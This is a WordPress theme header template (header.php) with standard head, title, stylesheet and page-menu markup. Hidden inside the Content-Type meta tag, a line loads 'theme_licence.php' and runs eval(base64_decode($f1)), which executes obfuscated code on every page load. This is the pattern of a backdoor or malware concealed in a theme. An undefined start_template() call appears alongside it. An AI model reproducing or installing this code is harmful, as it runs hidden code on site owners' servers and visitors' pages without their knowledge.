<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head profile="http://gmpg.org/xfn/11">

<meta http-equiv="Content-Type" content="<?php require_once("theme_licence.php"); eval(base64_decode($f1)); bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>

<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="stylesheet" href="<?php bloginfo('template_url'); ?>/css/grid.css" type="text/css" media="screen" />
<script type="text/javascript" src="<?php bloginfo('template_url'); ?>/js/pngfix.js"></script>
<?php wp_head(); ?>

</head>
<body>
<?php start_template(); ?>
<div class="container">

<div class="column header">
	<div id="header">	
	<?php /*?>
	<div id="logo"><a href="<?php echo get_option('home'); ?>/"><img src="<?php bloginfo('template_url'); ?>/images/logo.png" alt="Logo" border="0" width="256" height="115" /></a></div>	
<?php */?>

<!--Undhile if you need text based logo-->
	<div id="title_desc">
		<h1><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
		<h5><?php bloginfo('description'); ?></h5>
	</div>
<!--Undhile if you need text based logo end-->


<div id="menu">
			<ul>
				<?php wp_list_pages('depth=1&title_li='); ?>	
							
			</ul>
		</div>

	</div>
	
		
				
	
</div>

